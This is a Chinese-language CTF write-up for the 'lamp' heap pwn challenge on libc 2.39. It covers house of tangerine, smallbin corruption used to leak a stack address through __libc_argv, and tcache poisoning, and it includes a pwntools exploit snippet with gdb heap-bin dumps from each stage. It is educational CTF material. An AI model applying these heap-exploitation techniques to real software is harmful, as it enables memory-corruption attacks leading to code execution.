# lamp

我觉得是时候该接受我这辈子都学不会ctf的事实了，从pwn开始

参考wp： https://jonathankeller.net/ctf/lamp

题目设置：
- 可以分配任意个大小在0-0xff之间的chunk
- 每个chunk在分配到手后有任意大小的overflow，但这也是唯一一次可以（直接）往该chunk里写东西的机会
- 无free
- 无文件流（file streams），于是不能用fsop
- libc 2.39

第一步肯定是用喜闻乐见的house of tangerine free掉top chunk，从而利用bins的结构来实现一些攻击。wp提供了稳定实施house of tangerine的函数。偷了，下一步

第二步是尝试使分配器返回堆地址，因为2.39里栈上的rop算是最直接的rce方式。smallbins其实是个环形的双向链表结构，而头指针（head pointer）在libc里。意味着启用smallbin后，堆上会有一个指向libc的指针；加上有溢出的漏洞，可以做个partial overwrite，使那个libc指针指向`__libc_argv`（内含栈地址）。再修改一个smallbin使其指向包含libc指针的smallbin，最后分配时就能连着把栈地址也拿出来了

不过堆分配器拿smallbin时不是一个一个拿的，而是当tcache耗尽后，一次性拿出足够填满tcache的堆块。于是要注意smallbins的数量要正好，正好卡在tcache准备拿到损坏的chunk之前。这样还不够，想要这么做需要确保argv和environ里有正确的设置，因为smallbins会在不同的地方检查指针。这题正好提供了一个run文件来保证配置正确

好了欢迎来到噩梦堆风水。光看wp根本看不懂，以下是一些补充
```py
#每个pause处对应下方的一个layout
    print("fake", hex(fake_bins))
    print("target", hex(target_bin))
    print("start", hex(start_bin))

    gdb.attach(p)
    pause()
    p.send(b"58")
    BINS = 0
    for i in range(BINS):
        # This ended up being unused, it was here to help control the length
        # of the list of smallbins leading to the bin we wanted to overwrite
        p.send(p64(fake_bins + (i+1)*0x20)) # dummy
        p.send(p64(fake_bins + (i+1)*0x20)) # dummy
        p.send(p64(fake_bins + (i+1)*0x20)) # fd
        p.send(p64(fake_bins + (i+1)*0x20)) # bk

    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(b"X" * (target_bin - fake_bins - BINS*0x20 - 0x18))
    p.send(b"\x00" * 16)
    p.send(b"\xc8\x46\n")
    pause()
    p.send(b"30")
    p.send(b"Y" * (start_bin - start_overwrite_from))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(b"\n")
    pause()
    # Pop the tcache entries.
    for i in range(7):
        p.send(b"58\n")

    # Pop a smallbin entry, causing malloc to move entries from the smallbin to the tcache
    p.send(b"58\n")
    pause()
```
```
fake 0x5c8150256f90
target 0x5c8150278f78
start 0x5c8150366f90
```
这三个值还挺重要的
```sh
#第二步开始前的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  3]: 0x5c8150344fb0 —▸ 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  7]: 0x5c8150256f90 —▸ 0x5c8150234f90 —▸ 0x5c8150212f90 —▸ 0x5c81501f0f90 —▸ 0x5c81501cef90 —▸ 0x5c81501acf90 —▸ 0x5c815018bf90 ◂— 0
fastbins
0x60: 0x5c81503aaf80 ◂— 0
unsortedbin
empty
smallbins
0x60: 0x5c8150388f80 —▸ 0x5c8150366f80 —▸ 0x5c81502def80 —▸ 0x5c81502bcf80 —▸ 0x5c815029af80 —▸ 0x5c8150278f80 —▸ 0x7bdd81c03b70 ◂— 0x5c8150388f80
```
请记住这一切正常的样子（
```sh
#X溢出后的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  3]: 0x5c8150344fb0 —▸ 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  6]: 0x5c8150234f90 —▸ 0x5c8150212f90 —▸ 0x5c81501f0f90 —▸ 0x5c81501cef90 —▸ 0x5c81501acf90 —▸ 0x5c815018bf90 ◂— 0
fastbins
0x60: 0x5c81503aaf80 ◂— 0
unsortedbin
empty
smallbins
0x60 [corrupted]
FD: 0x5c8150388f80 —▸ 0x5c8150366f80 —▸ 0x5c81502def80 —▸ 0x5c81502bcf80 —▸ 0x5c815029af80
 —▸ 0x5c8150278f80 —▸ 0x7bdd81c046c8 ◂— 0
BK: 0x5c8150278f80 —▸ 0x5c815029af80 —▸ 0x5c81502bcf80 —▸ 0x5c81502def80 —▸ 0x5c8150366f80
 ◂— ...
```
这一步还好理解，作用是修改原本的libc指针，使其指向`__libc_argv`
```sh
#Y溢出后的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  2]: 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  6]: 0x5c8150234f90 —▸ 0x5c8150212f90 —▸ 0x5c81501f0f90 —▸ 0x5c81501cef90 —▸ 0x5c81501acf90 —▸ 0x5c815018bf90 ◂— 0
fastbins
0x60: 0x5c81503aaf80 ◂— 0
unsortedbin
empty
smallbins
0x60 [corrupted]
FD: 0x5c8150388f80 —▸ 0x5c8150366f80 —▸ 0x5c8150278f78 ◂— 0
BK: 0x5c8150278f80 —▸ 0x5c815029af80 —▸ 0x5c81502bcf80 —▸ 0x5c81502def80 —▸ 0x5c8150366f80
 ◂— ...
```
从这一步开始要留个心眼了。smallbin和tcache管理堆块的方式不同。smallbin中的堆块地址指向堆块的header部分；而tcache则是指向数据（fd）。所以如果想要修改`0x5c8150366f80`的fd，得溢出到`0x5c8150366f90`。这里我们将chunk start（`0x5c8150366f90`）的fd覆盖成了chunk target（`0x5c8150278f78`）。`0x5c8150278f78`其实就是原本fd包含libc地址的chunk地址（位于`0x5c8150278f80`）减8，原因在于后续从smallbin拿chunk填充tcache时走的是bk链，所以我们需要使libc地址位于bk处，而不是原本的fd
```sh
#清空tcache后的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  2]: 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  7]: 0x7fffad926878 —▸ 0x7bdd81c046d8 —▸ 0x5c8150278f88 —▸ 0x5c8150366f90 —▸ 0x5c81502def90 —▸ 0x5c81502bcf90 —▸ 0x5c815029af90 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
0x60 [corrupted]
FD: 0x5c8150388f80 —▸ 0x5c8150366f80 ◂— 0x5c849838ecf6
BK: 0x7fffad926fd1 ◂— 0x706d616c2f2e11
```
smallbins进tcache的顺序是倒着来的。不过我不确定为什么从`0x5c815029af80`开始。末尾的`0x5c8150278f80`倒着走一直走到`0x5c8150366f80`，下一个是`0x5c8150278f88`。由于错位，bk处正好是libc地址；再下一个正好是栈地址。此时正正好好7个填满tcache，程序不会崩溃

目前tcache里有了个栈地址。可是我们不知道任何地址，写也不知道写什么；而且只有一个地址，想要leak再写也至少要两个地址；再者，目前的地址指向程序的参数和环境变量，离栈底部非常远

第二个问题还是很好解决的。tcache+溢出，明显的tcache poisoning。可以将`tcache[40]->next`覆盖成tcache_entry(tcache_perthread_struct)；此时`malloc(0x38)`就能覆盖tcache结构